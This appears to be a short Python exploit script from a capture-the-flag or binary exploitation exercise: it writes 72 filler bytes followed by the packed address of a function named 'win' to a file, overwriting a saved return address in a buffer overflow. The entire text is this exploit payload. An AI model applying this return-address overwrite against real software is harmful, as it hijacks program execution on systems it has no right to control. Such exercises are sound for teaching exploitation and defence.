#!/usr/bin/env python3

from struct import pack

payload = b'a' * 72

# The address of the function win
payload += pack("<Q", 0x4015f1)

with open("payload", "wb") as f:
    f.write(payload)